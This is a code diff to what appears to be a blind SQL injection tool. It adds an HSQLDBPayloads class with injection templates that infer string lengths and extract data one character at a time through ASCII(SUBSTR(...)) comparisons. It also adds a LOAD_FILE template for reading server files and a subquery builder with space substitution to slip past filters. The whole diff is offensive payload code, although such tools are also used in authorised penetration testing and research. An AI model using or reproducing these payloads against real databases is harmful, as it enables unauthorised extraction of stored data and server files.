@@ -61,3 +61,22 @@ class SqlitePayloads:
 
     def one_line_query(self, column, table, where='', offset=0):
         return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)
+
+class HSQLDBPayloads:
+
+    def __init__(self, prefix='', space=' '):
+        self.prefix = prefix
+        self.space = space
+
+        self.and_size_eq = self.prefix + self.space + "CHARACTER_LENGTH({})={}"
+        self.and_size_lt = self.prefix + self.space + "CHARACTER_LENGTH({})<{}"
+        self.and_size_gt = self.prefix + self.space + "CHARACTER_LENGTH({})>{}"
+
+        self.and_char_at_is = self.prefix + self.space + "ASCII(SUBSTR({},{},1))={}"
+        self.and_char_at_lt = self.prefix + self.space + "ASCII(SUBSTR({},{},1))<{}"
+        self.and_char_at_gt = self.prefix + self.space + "ASCII(SUBSTR({},{},1))>{}"
+
+        self.str_file = "(LOAD_FILE({}))"
+
+    def one_line_query(self, column, table, where='', offset=0):
+        return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)
